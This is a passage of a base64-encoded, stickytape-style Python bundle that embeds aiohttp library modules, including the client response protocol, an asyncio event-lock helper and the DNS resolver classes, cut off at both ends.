CAjIHR5cGU6IE9wdGlvbmFsW0h0dHBSZXNwb25zZVBhcnNlcl1cclxuXHJcbiAgICAgICAgc2VsZi5fcmVhZF90aW1lb3V0ID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtmbG9hdF1cclxuICAgICAgICBzZWxmLl9yZWFkX3RpbWVvdXRfaGFuZGxlID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLlRpbWVySGFuZGxlXVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHVwZ3JhZGVkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3VwZ3JhZGVkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgc2hvdWxkX2Nsb3NlKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZCBpcyBub3QgTm9uZSBhbmQgbm90IHNlbGYuX3BheWxvYWQuaXNfZW9mKCkgb3Igc2VsZi5fdXBncmFkZWQ6XHJcbiAgICAgICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgIHNlbGYuX3Nob3VsZF9jbG9zZVxyXG4gICAgICAgICAgICBvciBzZWxmLl91cGdyYWRlZFxyXG4gICAgICAgICAgICBvciBzZWxmLmV4Y2VwdGlvbigpIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIG9yIHNlbGYuX3BheWxvYWRfcGFyc2VyIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIG9yIGxlbihzZWxmKSA+IDBcclxuICAgICAgICAgICAgb3IgYm9vbChzZWxmLl90YWlsKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgZm9yY2VfY2xvc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9zaG91bGRfY2xvc2UgPSBUcnVlXHJcblxyXG4gICAgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJhbnNwb3J0ID0gc2VsZi50cmFuc3BvcnRcclxuICAgICAgICBpZiB0cmFuc3BvcnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHRyYW5zcG9ydC5jbG9zZSgpXHJcbiAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0ID0gTm9uZVxyXG4gICAgICAgICAgICBzZWxmLl9wYXlsb2FkID0gTm9uZVxyXG4gICAgICAgICAgICBzZWxmLl9kcm9wX3RpbWVvdXQoKVxyXG5cclxuICAgIGRlZiBpc19jb25uZWN0ZWQoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi50cmFuc3BvcnQgaXMgbm90IE5vbmUgYW5kIG5vdCBzZWxmLnRyYW5zcG9ydC5pc19jbG9zaW5nKClcclxuXHJcbiAgICBkZWYgY29ubmVjdGlvbl9sb3N0KHNlbGYsIGV4YzogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl0pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZHJvcF90aW1lb3V0KClcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZF9wYXJzZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHdpdGggc3VwcHJlc3MoRXhjZXB0aW9uKTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyLmZlZWRfZW9mKClcclxuXHJcbiAgICAgICAgdW5jb21wbGV0ZWQgPSBOb25lXHJcbiAgICAgICAgaWYgc2VsZi5fcGFyc2VyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICB1bmNvbXBsZXRlZCA9IHNlbGYuX3BhcnNlci5mZWVkX2VvZigpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246XHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9wYXlsb2FkIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWQuc2V0X2V4Y2VwdGlvbihcclxuICAgICAgICAgICAgICAgICAgICAgICAgQ2xpZW50UGF5bG9hZEVycm9yKCJSZXNwb25zZSBwYXlsb2FkIGlzIG5vdCBjb21wbGV0ZWQiKVxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgbm90IHNlbGYuaXNfZW9mKCk6XHJcbiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoZXhjLCBPU0Vycm9yKTpcclxuICAgICAgICAgICAgICAgIGV4YyA9IENsaWVudE9TRXJyb3IoKmV4Yy5hcmdzKVxyXG4gICAgICAgICAgICBpZiBleGMgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIGV4YyA9IFNlcnZlckRpc2Nvbm5lY3RlZEVycm9yKHVuY29tcGxldGVkKVxyXG4gICAgICAgICAgICAjIGFzc2lnbnMgc2VsZi5fc2hvdWxkX2Nsb3NlIHRvIFRydWUgYXMgc2lkZSBlZmZlY3QsXHJcbiAgICAgICAgICAgICMgd2UgZG8gaXQgYW55d2F5IGJlbG93XHJcbiAgICAgICAgICAgIHNlbGYuc2V0X2V4Y2VwdGlvbihleGMpXHJcblxyXG4gICAgICAgIHNlbGYuX3Nob3VsZF9jbG9zZSA9IFRydWVcclxuICAgICAgICBzZWxmLl9wYXJzZXIgPSBOb25lXHJcbiAgICAgICAgc2VsZi5fcGF5bG9hZCA9IE5vbmVcclxuICAgICAgICBzZWxmLl9wYXlsb2FkX3BhcnNlciA9IE5vbmVcclxuICAgICAgICBzZWxmLl9yZWFkaW5nX3BhdXNlZCA9IEZhbHNlXHJcblxyXG4gICAgICAgIHN1cGVyKCkuY29ubmVjdGlvbl9sb3N0KGV4YylcclxuXHJcbiAgICBkZWYgZW9mX3JlY2VpdmVkKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBzaG91bGQgY2FsbCBwYXJzZXIuZmVlZF9lb2YoKSBtb3N0IGxpa2VseVxyXG4gICAgICAgIHNlbGYuX2Ryb3BfdGltZW91dCgpXHJcblxyXG4gICAgZGVmIHBhdXNlX3JlYWRpbmcoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLnBhdXNlX3JlYWRpbmcoKVxyXG4gICAgICAgIHNlbGYuX2Ryb3BfdGltZW91dCgpXHJcblxyXG4gICAgZGVmIHJlc3VtZV9yZWFkaW5nKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5yZXN1bWVfcmVhZGluZygpXHJcbiAgICAgICAgc2VsZi5fcmVzY2hlZHVsZV90aW1lb3V0KClcclxuXHJcbiAgICBkZWYgc2V0X2V4Y2VwdGlvbihzZWxmLCBleGM6IEJhc2VFeGNlcHRpb24pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fc2hvdWxkX2Nsb3NlID0gVHJ1ZVxyXG4gICAgICAgIHNlbGYuX2Ryb3BfdGltZW91dCgpXHJcbiAgICAgICAgc3VwZXIoKS5zZXRfZXhjZXB0aW9uKGV4YylcclxuXHJcbiAgICBkZWYgc2V0X3BhcnNlcihzZWxmLCBwYXJzZXI6IEFueSwgcGF5bG9hZDogQW55KSAtPiBOb25lOlxyXG4gICAgICAgICMgVE9ETzogYWN0dWFsIHR5cGVzIGFyZTpcclxuICAgICAgICAjICAgcGFyc2VyOiBXZWJTb2NrZXRSZWFkZXJcclxuICAgICAgICAjICAgcGF5bG9hZDogRmxvd0NvbnRyb2xEYXRhUXVldWVcclxuICAgICAgICAjIGJ1dCB0aGV5IGFyZSBub3QgZ2VuZXJpIGVub3VnaFxyXG4gICAgICAgICMgTmVlZCBhbiBBQkMgZm9yIGJvdGggdHlwZXNcclxuICAgICAgICBzZWxmLl9wYXlsb2FkID0gcGF5bG9hZFxyXG4gICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gcGFyc2VyXHJcblxyXG4gICAgICAgIHNlbGYuX2Ryb3BfdGltZW91dCgpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX3RhaWw6XHJcbiAgICAgICAgICAgIGRhdGEsIHNlbGYuX3RhaWwgPSBzZWxmLl90YWlsLCBiIiJcclxuICAgICAgICAgICAgc2VsZi5kYXRhX3JlY2VpdmVkKGRhdGEpXHJcblxyXG4gICAgZGVmIHNldF9yZXNwb25zZV9wYXJhbXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICAqLFxyXG4gICAgICAgIHRpbWVyOiBPcHRpb25hbFtCYXNlVGltZXJDb250ZXh0XSA9IE5vbmUsXHJcbiAgICAgICAgc2tpcF9wYXlsb2FkOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgcmVhZF91bnRpbF9lb2Y6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBhdXRvX2RlY29tcHJlc3M6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIHJlYWRfdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSxcclxuICAgICAgICByZWFkX2J1ZnNpemU6IGludCA9IDIgKiogMTYsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fc2tpcF9wYXlsb2FkID0gc2tpcF9wYXlsb2FkXHJcblxyXG4gICAgICAgIHNlbGYuX3JlYWRfdGltZW91dCA9IHJlYWRfdGltZW91dFxyXG4gICAgICAgIHNlbGYuX3Jlc2NoZWR1bGVfdGltZW91dCgpXHJcblxyXG4gICAgICAgIHNlbGYuX3BhcnNlciA9IEh0dHBSZXNwb25zZVBhcnNlcihcclxuICAgICAgICAgICAgc2VsZixcclxuICAgICAgICAgICAgc2VsZi5fbG9vcCxcclxuICAgICAgICAgICAgcmVhZF9idWZzaXplLFxyXG4gICAgICAgICAgICB0aW1lcj10aW1lcixcclxuICAgICAgICAgICAgcGF5bG9hZF9leGNlcHRpb249Q2xpZW50UGF5bG9hZEVycm9yLFxyXG4gICAgICAgICAgICByZXNwb25zZV93aXRoX2JvZHk9bm90IHNraXBfcGF5bG9hZCxcclxuICAgICAgICAgICAgcmVhZF91bnRpbF9lb2Y9cmVhZF91bnRpbF9lb2YsXHJcbiAgICAgICAgICAgIGF1dG9fZGVjb21wcmVzcz1hdXRvX2RlY29tcHJlc3MsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl90YWlsOlxyXG4gICAgICAgICAgICBkYXRhLCBzZWxmLl90YWlsID0gc2VsZi5fdGFpbCwgYiIiXHJcbiAgICAgICAgICAgIHNlbGYuZGF0YV9yZWNlaXZlZChkYXRhKVxyXG5cclxuICAgIGRlZiBfZHJvcF90aW1lb3V0KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fcmVhZF90aW1lb3V0X2hhbmRsZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fcmVhZF90aW1lb3V0X2hhbmRsZS5jYW5jZWwoKVxyXG4gICAgICAgICAgICBzZWxmLl9yZWFkX3RpbWVvdXRfaGFuZGxlID0gTm9uZVxyXG5cclxuICAgIGRlZiBfcmVzY2hlZHVsZV90aW1lb3V0KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgdGltZW91dCA9IHNlbGYuX3JlYWRfdGltZW91dFxyXG4gICAgICAgIGlmIHNlbGYuX3JlYWRfdGltZW91dF9oYW5kbGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3JlYWRfdGltZW91dF9oYW5kbGUuY2FuY2VsKClcclxuXHJcbiAgICAgICAgaWYgdGltZW91dDpcclxuICAgICAgICAgICAgc2VsZi5fcmVhZF90aW1lb3V0X2hhbmRsZSA9IHNlbGYuX2xvb3AuY2FsbF9sYXRlcihcclxuICAgICAgICAgICAgICAgIHRpbWVvdXQsIHNlbGYuX29uX3JlYWRfdGltZW91dFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5fcmVhZF90aW1lb3V0X2hhbmRsZSA9IE5vbmVcclxuXHJcbiAgICBkZWYgX29uX3JlYWRfdGltZW91dChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGV4YyA9IFNlcnZlclRpbWVvdXRFcnJvcigiVGltZW91dCBvbiByZWFkaW5nIGRhdGEgZnJvbSBzb2NrZXQiKVxyXG4gICAgICAgIHNlbGYuc2V0X2V4Y2VwdGlvbihleGMpXHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fcGF5bG9hZC5zZXRfZXhjZXB0aW9uKGV4YylcclxuXHJcbiAgICBkZWYgZGF0YV9yZWNlaXZlZChzZWxmLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9yZXNjaGVkdWxlX3RpbWVvdXQoKVxyXG5cclxuICAgICAgICBpZiBub3QgZGF0YTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgICMgY3VzdG9tIHBheWxvYWQgcGFyc2VyXHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZF9wYXJzZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGVvZiwgdGFpbCA9IHNlbGYuX3BheWxvYWRfcGFyc2VyLmZlZWRfZGF0YShkYXRhKVxyXG4gICAgICAgICAgICBpZiBlb2Y6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9wYXlsb2FkID0gTm9uZVxyXG4gICAgICAgICAgICAgICAgc2VsZi5fcGF5bG9hZF9wYXJzZXIgPSBOb25lXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgdGFpbDpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmRhdGFfcmVjZWl2ZWQodGFpbClcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWYgc2VsZi5fdXBncmFkZWQgb3Igc2VsZi5fcGFyc2VyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICAjIGkuZS4gd2Vic29ja2V0IGNvbm5lY3Rpb24sIHdlYnNvY2tldCBwYXJzZXIgaXMgbm90IHNldCB5ZXRcclxuICAgICAgICAgICAgICAgIHNlbGYuX3RhaWwgKz0gZGF0YVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgIyBwYXJzZSBodHRwIG1lc3NhZ2VzXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZXMsIHVwZ3JhZGVkLCB0YWlsID0gc2VsZi5fcGFyc2VyLmZlZWRfZGF0YShkYXRhKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEJhc2VFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudHJhbnNwb3J0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAjIGNvbm5lY3Rpb24ucmVsZWFzZSgpIGNvdWxkIGJlIGNhbGxlZCBCRUZPUkVcclxuICAgICAgICAgICAgICAgICAgICAgICAgIyBkYXRhX3JlY2VpdmVkKCksIHRoZSB0cmFuc3BvcnQgaXMgYWxyZWFkeVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAjIGNsb3NlZCBpbiB0aGlzIGNhc2VcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmFuc3BvcnQuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgICAgICMgc2hvdWxkX2Nsb3NlIGlzIFRydWUgYWZ0ZXIgdGhlIGNhbGxcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLnNldF9leGNlcHRpb24oZXhjKVxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICAgICAgICAgIHNlbGYuX3VwZ3JhZGVkID0gdXBncmFkZWRcclxuXHJcbiAgICAgICAgICAgICAgICBwYXlsb2FkOiBPcHRpb25hbFtTdHJlYW1SZWFkZXJdID0gTm9uZVxyXG4gICAgICAgICAgICAgICAgZm9yIG1lc3NhZ2UsIHBheWxvYWQgaW4gbWVzc2FnZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbWVzc2FnZS5zaG91bGRfY2xvc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX3Nob3VsZF9jbG9zZSA9IFRydWVcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcGF5bG9hZCA9IHBheWxvYWRcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5fc2tpcF9wYXlsb2FkIG9yIG1lc3NhZ2UuY29kZSBpbiAoMjA0LCAzMDQpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZlZWRfZGF0YSgobWVzc2FnZSwgRU1QVFlfUEFZTE9BRCksIDApXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5mZWVkX2RhdGEoKG1lc3NhZ2UsIHBheWxvYWQpLCAwKVxyXG4gICAgICAgICAgICAgICAgaWYgcGF5bG9hZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAjIG5ldyBtZXNzYWdlKHMpIHdhcyBwcm9jZXNzZWRcclxuICAgICAgICAgICAgICAgICAgICAjIHJlZ2lzdGVyIHRpbWVvdXQgaGFuZGxlciB1bnN1YnNjcmliaW5nXHJcbiAgICAgICAgICAgICAgICAgICAgIyBlaXRoZXIgb24gZW5kLW9mLXN0cmVhbSBvciBpbW1lZGlhdGVseSBmb3JcclxuICAgICAgICAgICAgICAgICAgICAjIEVNUFRZX1BBWUxPQURcclxuICAgICAgICAgICAgICAgICAgICBpZiBwYXlsb2FkIGlzIG5vdCBFTVBUWV9QQVlMT0FEOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkLm9uX2VvZihzZWxmLl9kcm9wX3RpbWVvdXQpXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fZHJvcF90aW1lb3V0KClcclxuXHJcbiAgICAgICAgICAgICAgICBpZiB0YWlsOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHVwZ3JhZGVkOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmRhdGFfcmVjZWl2ZWQodGFpbClcclxuICAgICAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl90YWlsID0gdGFpbFxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9sb2Nrcy5weScsIGInaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IGNvbGxlY3Rpb25zXHJcbmZyb20gdHlwaW5nIGltcG9ydCBBbnksIERlcXVlLCBPcHRpb25hbFxyXG5cclxuXHJcbmNsYXNzIEV2ZW50UmVzdWx0T3JFcnJvcjpcclxuICAgICIiIkV2ZW50IGFzeW5jaW8gbG9jayBoZWxwZXIgY2xhc3MuXHJcblxyXG4gICAgV3JhcHMgdGhlIEV2ZW50IGFzeW5jaW8gbG9jayBhbGxvd2luZyBlaXRoZXIgdG8gYXdha2UgdGhlXHJcbiAgICBsb2NrZWQgVGFza3Mgd2l0aG91dCBhbnkgZXJyb3Igb3IgcmFpc2luZyBhbiBleGNlcHRpb24uXHJcblxyXG4gICAgdGhhbmtzIHRvIEB2b3JwYWxzbWl0aCBmb3IgdGhlIHNpbXBsZSBkZXNpZ24uXHJcbiAgICAiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9sb29wID0gbG9vcFxyXG4gICAgICAgIHNlbGYuX2V4YyA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl1cclxuICAgICAgICBzZWxmLl9ldmVudCA9IGFzeW5jaW8uRXZlbnQoKVxyXG4gICAgICAgIHNlbGYuX3dhaXRlcnMgPSBjb2xsZWN0aW9ucy5kZXF1ZSgpICAjIHR5cGU6IERlcXVlW2FzeW5jaW8uRnV0dXJlW0FueV1dXHJcblxyXG4gICAgZGVmIHNldChzZWxmLCBleGM6IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9leGMgPSBleGNcclxuICAgICAgICBzZWxmLl9ldmVudC5zZXQoKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3YWl0KHNlbGYpIC0+IEFueTpcclxuICAgICAgICB3YWl0ZXIgPSBzZWxmLl9sb29wLmNyZWF0ZV90YXNrKHNlbGYuX2V2ZW50LndhaXQoKSlcclxuICAgICAgICBzZWxmLl93YWl0ZXJzLmFwcGVuZCh3YWl0ZXIpXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICB2YWwgPSBhd2FpdCB3YWl0ZXJcclxuICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICBzZWxmLl93YWl0ZXJzLnJlbW92ZSh3YWl0ZXIpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2V4YyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2Ugc2VsZi5fZXhjXHJcblxyXG4gICAgICAgIHJldHVybiB2YWxcclxuXHJcbiAgICBkZWYgY2FuY2VsKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiQ2FuY2VsIGFsbCB3YWl0ZXJzIiIiXHJcbiAgICAgICAgZm9yIHdhaXRlciBpbiBzZWxmLl93YWl0ZXJzOlxyXG4gICAgICAgICAgICB3YWl0ZXIuY2FuY2VsKClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvcmVzb2x2ZXIucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBzb2NrZXRcclxuZnJvbSB0eXBpbmcgaW1wb3J0IEFueSwgRGljdCwgTGlzdCwgT3B0aW9uYWwsIFR5cGUsIFVuaW9uXHJcblxyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0UmVzb2x2ZXJcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgZ2V0X3J1bm5pbmdfbG9vcFxyXG5cclxuX19hbGxfXyA9ICgiVGhyZWFkZWRSZXNvbHZlciIsICJBc3luY1Jlc29sdmVyIiwgIkRlZmF1bHRSZXNvbHZlciIpXHJcblxyXG50cnk6XHJcbiAgICBpbXBvcnQgYWlvZG5zXHJcblxyXG4gICAgIyBhaW9kbnNfZGVmYXVsdCA9IGhhc2F0dHIoYWlvZG5zLkROU1Jlc29sdmVyLCBcJ2dldGhvc3RieW5hbWVcJylcclxuZXhjZXB0IEltcG9ydEVycm9yOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBhaW9kbnMgPSBOb25lXHJcblxyXG5haW9kbnNfZGVmYXVsdCA9IEZhbHNlXHJcblxyXG5cclxuY2xhc3MgVGhyZWFkZWRSZXNvbHZlcihBYnN0cmFjdFJlc29sdmVyKTpcclxuICAgICIiIlRocmVhZGVkIHJlc29sdmVyLlxyXG5cclxuICAgIFVzZXMgYW4gRXhlY3V0b3IgZm9yIHN5bmNocm9ub3VzIGdldGFkZHJpbmZvKCkgY2FsbHMuXHJcbiAgICBjb25jdXJyZW50LmZ1dHVyZXMuVGhyZWFkUG9vbEV4ZWN1dG9yIGlzIHVzZWQgYnkgZGVmYXVsdC5cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IGdldF9ydW5uaW5nX2xvb3AobG9vcClcclxuXHJcbiAgICBhc3luYyBkZWYgcmVzb2x2ZShcclxuICAgICAgICBzZWxmLCBob3N0bmFtZTogc3RyLCBwb3J0OiBpbnQgPSAwLCBmYW1pbHk6IGludCA9IHNvY2tldC5BRl9JTkVUXHJcbiAgICApIC0+IExpc3RbRGljdFtzdHIsIEFueV1dOlxyXG4gICAgICAgIGluZm9zID0gYXdhaXQgc2VsZi5fbG9vcC5nZXRhZGRyaW5mbyhcclxuICAgICAgICAgICAgaG9zdG5hbWUsXHJcbiAgICAgICAgICAgIHBvcnQsXHJcbiAgICAgICAgICAgIHR5cGU9c29ja2V0LlNPQ0tfU1RSRUFNLFxyXG4gICAgICAgICAgICBmYW1pbHk9ZmFtaWx5LFxyXG4gICAgICAgICAgICBmbGFncz1zb2NrZXQuQUlfQUREUkNPTkZJRyxcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIGhvc3RzID0gW11cclxuICAgICAgICBmb3IgZmFtaWx5LCBfLCBwcm90bywgXywgYWRkcmVzcyBpbiBpbmZvczpcclxuICAgICAgICAgICAgaWYgZmFtaWx5ID09IHNvY2tldC5BRl9JTkVUNjpcclxuICAgICAgICAgICAgICAgIGlmIGxlbihhZGRyZXNzKSA8IDM6XHJcbiAgICAgICAgICAgICAgICAgICAgIyBJUHY2IGlzIG5vdCBzdXBwb3J0ZWQgYnkgUHl0aG9uIGJ1aWxkLFxyXG4gICAgICAgICAgICAgICAgICAgICMgb3IgSVB2NiBpcyBub3QgZW5hYmxlZCBpbiB0aGUgaG9zdFxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICBpZiBhZGRyZXNzWzNdOiAgIyB0eXBlOiBpZ25vcmVbbWlzY11cclxuICAgICAgICAgICAgICAgICAgICAjIFRoaXMgaXMgZXNzZW50aWFsIGZvciBsaW5rLWxvY2FsIElQdjYgYWRkcmVzc2VzLlxyXG4gICAgICAgICAgICAgICAgICAgICMgTEwgSVB2NiBpcyBhIFZFUlkgcmFyZSBjYXNlLiBTdHJpY3RseSBzcGVha2luZywgd2Ugc2hvdWxkIHVzZVxyXG4gICAgICAgICAgICAgICAgICAgICMgZ2V0bmFtZWluZm8oKSB1bmNvbmRpdGlvbmFsbHksIGJ1dCBwZXJmb3JtYW5jZSBtYWtlcyBzZW5zZS5cclxuICAgICAgICAgICAgICAgICAgICBob3N0LCBfcG9ydCA9IHNvY2tldC5nZXRuYW1laW5mbyhcclxuICAgICAgICAgICAgICAgICAgICAgICAgYWRkcmVzcywgc29ja2V0Lk5JX05VTUVSSUNIT1NUIHwgc29ja2V0Lk5JX05VTUVSSUNTRVJWXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgIHBvcnQgPSBpbnQoX3BvcnQpXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIGhvc3QsIHBvcnQgPSBhZGRyZXNzWzoyXVxyXG4gICAgICAgICAgICBlbHNlOiAgIyBJUHY0XHJcbiAgICAgICAgICAgICAgICBhc3NlcnQgZmFtaWx5ID09IHNvY2tldC5BRl9JTkVUXHJcbiAgICAgICAgICAgICAgICBob3N0LCBwb3J0ID0gYWRkcmVzcyAgIyB0eXBlOiBpZ25vcmVbbWlzY11cclxuICAgICAgICAgICAgaG9zdHMuYXBwZW5kKFxyXG4gICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICJob3N0bmFtZSI6IGhvc3RuYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICJob3N0IjogaG9zdCxcclxuICAgICAgICAgICAgICAgICAgICAicG9ydCI6IHBvcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgImZhbWlseSI6IGZhbWlseSxcclxuICAgICAgICAgICAgICAgICAgICAicHJvdG8iOiBwcm90byxcclxuICAgICAgICAgICAgICAgICAgICAiZmxhZ3MiOiBzb2NrZXQuQUlfTlVNRVJJQ0hPU1QgfCBzb2NrZXQuQUlfTlVNRVJJQ1NFUlYsXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIGhvc3RzXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEFzeW5jUmVzb2x2ZXIoQWJzdHJhY3RSZXNvbHZlcik6XHJcbiAgICAiIiJVc2UgdGhlIGBhaW9kbnNgIHBhY2thZ2UgdG8gbWFrZSBhc3luY2hyb25vdXMgRE5TIGxvb2t1cHMiIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbiAgICAgICAgKmFyZ3M6IEFueSxcclxuICAgICAgICAqKmt3YXJnczogQW55XHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgYWlvZG5zIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiUmVzb2x2ZXIgcmVxdWlyZXMgYWlvZG5zIGxpYnJhcnkiKVxyXG5cclxuICAgICAgICBzZWxmLl9sb29wID0gZ2V0X3J1bm5